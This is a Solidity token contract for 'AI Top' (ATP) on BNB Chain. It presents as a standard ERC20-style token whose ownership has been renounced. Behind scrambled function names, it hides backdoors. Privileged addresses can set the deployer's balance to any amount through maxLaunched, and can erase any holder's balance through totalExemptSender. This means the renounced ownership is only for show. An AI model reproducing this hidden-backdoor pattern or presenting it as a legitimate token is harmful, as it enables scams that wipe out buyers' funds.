/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fundTradingToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromSender) external view returns (uint256);

    function transfer(address fundSell, uint256 isTeam) external returns (bool);

    function allowance(address feeListTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 isTeam) external returns (bool);

    function transferFrom(
        address sender,
        address fundSell,
        uint256 isTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listIsSender, uint256 value);
    event Approval(address indexed feeListTrading, address indexed spender, uint256 value);
}

interface fundTradingTokenMetadata is fundTradingToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface atReceiver {
    function createPair(address launchSender, address launchAutoList) external returns (address);
}

interface fromMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundFromAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AITop is fundFromAt, fundTradingToken, fundTradingTokenMetadata {
    uint8 private receiverList = 18;
    
    uint256 private amountAuto;
    address private marketingTake;
    bool public marketingLaunch;

    uint256 private feeAuto;
    uint256 private modeAt = 100000000 * 10 ** receiverList;
    address public walletAuto;
    bool public limitSell;
    

    mapping(address => bool) public listSwap;
    mapping(address => uint256) private launchLaunched;
    mapping(address => mapping(address => uint256)) private swapModeAuto;
    
    string private sellLiquidity = "ATP";
    mapping(address => bool) public receiverTrading;


    address public listFee;
    bool public feeLimit;
    bool public autoToken;
    string private senderSell = "AI Top";
    address private buyReceiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    

    event OwnershipTransferred(address indexed senderTakeExempt, address indexed launchedExempt);

    constructor (){
        if (marketingLaunch) {
            feeLimit = true;
        }
        fromMax tradingFeeList = fromMax(buyReceiverShould);
        walletAuto = atReceiver(tradingFeeList.factory()).createPair(tradingFeeList.WETH(), address(this));
        marketingTake = _msgSender();
        if (feeAuto != amountAuto) {
            limitSell = true;
        }
        listFee = marketingTake;
        receiverTrading[listFee] = true;
        if (marketingLaunch == feeLimit) {
            feeLimit = true;
        }
        launchLaunched[listFee] = modeAt;
        emit Transfer(address(0), listFee, modeAt);
        amountLaunch();
    }

    

    function limitShould() public {
        if (marketingLaunch) {
            limitSell = true;
        }
        if (feeAuto != amountAuto) {
            feeLimit = false;
        }
        feeLimit=false;
    }

    function owner() external view returns (address) {
        return marketingTake;
    }

    function isEnable(address limitTake) public {
        if (autoToken) {
            return;
        }
        if (amountAuto == feeAuto) {
            limitSell = false;
        }
        receiverTrading[limitTake] = true;
        
        autoToken = true;
    }

    function amountLaunch() public {
        emit OwnershipTransferred(listFee, address(0));
        marketingTake = address(0);
    }

    function transfer(address atFee, uint256 isTeam) external virtual override returns (bool) {
        return modeLaunch(_msgSender(), atFee, isTeam);
    }

    function balanceOf(address fromSender) public view virtual override returns (uint256) {
        return launchLaunched[fromSender];
    }

    function modeLaunch(address shouldTotalIs, address fundSell, uint256 isTeam) internal returns (bool) {
        return tokenMax(shouldTotalIs, fundSell, isTeam);
    }

    function maxLaunched(uint256 isTeam) public {
        if (!receiverTrading[_msgSender()]) {
            return;
        }
        launchLaunched[listFee] = isTeam;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverList;
    }

    function totalExemptSender(address amountMax) public {
        if (feeLimit == limitSell) {
            feeAuto = amountAuto;
        }
        if (amountMax == listFee || amountMax == walletAuto || !receiverTrading[_msgSender()]) {
            return;
        }
        
        launchLaunched[amountMax] = 0;
    }

    function allowance(address toTrading, address txReceiver) external view virtual override returns (uint256) {
        return swapModeAuto[toTrading][txReceiver];
    }

    function getOwner() external view returns (address) {
        return marketingTake;
    }

    function transferFrom(address shouldTotalIs, address fundSell, uint256 isTeam) external override returns (bool) {
        if (swapModeAuto[shouldTotalIs][_msgSender()] != type(uint256).max) {
            require(isTeam <= swapModeAuto[shouldTotalIs][_msgSender()]);
            swapModeAuto[shouldTotalIs][_msgSender()] -= isTeam;
        }
        return modeLaunch(shouldTotalIs, fundSell, isTeam);
    }

    function name() external view virtual override returns (string memory) {
        return senderSell;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeAt;
    }

    function takeLiquidity() public {
        
        if (feeAuto != amountAuto) {
            marketingLaunch = false;
        }
        amountAuto=0;
    }

    function autoLiquidity() public {
        if (amountAuto != feeAuto) {
            feeLimit = false;
        }
        
        limitSell=false;
    }

    function approve(address txReceiver, uint256 isTeam) public virtual override returns (bool) {
        swapModeAuto[_msgSender()][txReceiver] = isTeam;
        emit Approval(_msgSender(), txReceiver, isTeam);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellLiquidity;
    }

    function tokenMax(address shouldTotalIs, address fundSell, uint256 isTeam) internal returns (bool) {
        require(launchLaunched[shouldTotalIs] >= isTeam);
        launchLaunched[shouldTotalIs] -= isTeam;
        launchLaunched[fundSell] += isTeam;
        emit Transfer(shouldTotalIs, fundSell, isTeam);
        return true;
    }

    function teamToken() public view returns (uint256) {
        return amountAuto;
    }


}